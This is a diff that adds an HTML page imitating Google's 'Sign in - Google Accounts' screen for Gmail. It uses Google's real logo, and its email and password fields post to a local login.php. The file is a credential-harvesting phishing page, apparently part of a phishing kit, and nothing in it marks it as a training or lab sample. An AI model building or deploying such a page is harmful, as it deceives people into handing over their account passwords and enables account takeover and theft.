@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+        <h1>Sign in</h1>
+        <p>to continue to Gmail</p>
+        <form action="login.php" method="post">
+            <div class="input-group">
+                <input type="email" name="email" required>
+                <label>Email or phone</label>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" required>
+                <label>Password</label>
+            </div>
+            <div class="links">
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="actions">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
